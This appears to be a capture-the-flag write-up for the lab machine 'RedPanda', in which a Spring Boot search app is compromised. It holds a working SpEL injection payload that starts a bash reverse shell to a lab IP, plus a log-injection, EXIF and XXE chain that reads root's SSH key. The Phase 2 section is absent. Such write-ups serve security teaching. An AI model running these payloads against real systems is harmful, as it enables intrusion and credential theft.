Port 8080 runs a Spring Boot application — a "Red Panda Search Engine" that lets users search for panda images and displays view counts per author.

Phase 1

Initial Access — Spring Expression Language (SpEL) SSTI

Confirming SSTI

The search field reflects user input. Testing for Server-Side Template Injection with SpEL syntax:

# Standard SSTI test — ${7*7} is blocked, but *{} works
Search: *{7*7}
You searched for: 49
SpEL vs Jinja2 SSTI Spring Boot uses Thymeleaf as its template engine, which supports SpEL (Spring Expression Language) via *{} and ${} syntax. Unlike Python's Jinja2 where you chain __globals__, SpEL gives direct access to Java's Runtime class for command execution. The $ character is often blocked, but * works as an alternative prefix.

Reverse Shell via SpEL

Java's Runtime.exec() doesn't handle bash pipes/redirects directly. Use base64 encoding to work around this:

# Step 1: Generate base64-encoded reverse shell command
$ echo -n 'bash -i >& /dev/tcp/10.10.14.15/9001 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS85MDAxIDA+JjE=

# Step 2: Start listener
$ nc -lvnp 9001

# Step 3: Send SpEL payload via search (use curl to avoid URL encoding issues)
$ curl -s http://redpanda.htb:8080/search \
    -d 'name=*{T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS85MDAxIDA+JjE=}|{base64,-d}|bash"})}'
Why {echo,BASE64}|{base64,-d}|bash? This syntax uses commas instead of spaces. Java's Runtime.exec() splits on spaces internally when given a single string, breaking commands with spaces in arguments. By using {echo,PAYLOAD}, bash treats the comma-separated values as a single word, avoiding the split problem. The pipe chain decodes the base64 and executes it.

A root cron job periodically runs LogParser, which processes /opt/panda_search/redpanda.log.

Analyzing LogParser Source

woodenk@redpanda:~$ cat /opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java

Two critical functions:

parselog() — reads each line of redpanda.log, splits by ||, extracts the URI field, and if it contains .jpg, reads the image's EXIF Artist metadata to determine which author's export XML to update.

addViewTo() — takes the Artist name, constructs a path /credits/ARTIST_export.xml, parses it as XML, increments the view count, and writes it back. This XML parsing is vulnerable to XXE because it doesn't disable external entities.

The three-stage chain 1. Log injection: We control the User-Agent header, which gets written to redpanda.log. By injecting || delimiters, we shift what LogParser interprets as the URI field, pointing it to our controlled image file. 2. EXIF metadata: LogParser reads the Artist field from our image. We set Artist to a path-traversal value that points to our malicious XML. 3. XXE: LogParser parses our XML file, which contains an XXE payload reading root's SSH key. The key content gets written into the XML's author field.
Phase 3

Privilege Escalation — Log Injection → XXE → Root

Step 1: Prepare the Image with Malicious Artist Metadata

# Copy an existing panda image to /tmp
woodenk@redpanda:~$ cp /opt/panda_search/src/main/resources/static/img/greg.jpg /tmp/greg.jpg

# Set the Artist field to a path traversal pointing to our XML
# LogParser will construct: /credits/../tmp/pwned_export.xml → /tmp/pwned_export.xml
woodenk@redpanda:~$ exiftool -Artist='../tmp/pwned' /tmp/greg.jpg

# Verify
woodenk@redpanda:~$ exiftool -Artist /tmp/greg.jpg
Artist                          : ../tmp/pwned

Step 2: Create the Malicious XML (XXE Payload)

woodenk@redpanda:~$ cat << 'EOF' > /tmp/pwned_export.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">
]>
<credits>
  <author>&xxe;</author>
  <image>
    <uri>/../../../../../../../../../tmp/greg.jpg</uri>
    <views>0</views>
  </image>
</credits>
EOF
XML structure must match LogParser's expectations LogParser expects <credits> with <author> and <image><uri> tags. Using any other structure (like <userInfo>) will be silently ignored. The XXE entity must be placed inside <author> because that's the field LogParser reads and writes back — it's where the exfiltrated data will appear.

Step 3: Inject the Log Entry via Burp Suite

Send a search request with a crafted User-Agent that manipulates the log format. In Burp Repeater:

POST /search HTTP/1.1
Host: redpanda.htb:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: ||/../../../../../../tmp/greg.jpg
Content-Length: 9
Connection: close

name=greg

This creates a log entry where LogParser interprets /../../../../../../tmp/greg.jpg as the URI field:

# Verify the log entry was written
woodenk@redpanda:~$ cat /opt/panda_search/redpanda.log
200||10.10.14.15||||/../../../../../../tmp/greg.jpg||/search

Appendix

Key Takeaways

SpEL SSTI uses *{} when ${} is blocked.

Thymeleaf supports both prefixes. If one is filtered, try the other. SpEL gives direct access to java.lang.Runtime for command execution.

Java RCE needs special encoding.

Runtime.exec() splits on spaces. Use {echo,BASE64}|{base64,-d}|bash with commas instead of spaces, or pass a String[] array to exec().

Log injection + XXE is a powerful chain.

If you control any field that gets written to a log, and a privileged process parses that log, you can redirect execution. Here: User-Agent → log → LogParser → image EXIF → XML → XXE → file read.

EXIF metadata is a hidden data channel.

Image metadata fields (Artist, Comment, etc.) can carry payloads that downstream tools process. exiftool is the go-to tool for reading and writing EXIF data.

The logs group membership was the key.

Being in the logs group gave write access to redpanda.log and read access to the LogParser source code. Always check id and groups for unusual memberships.
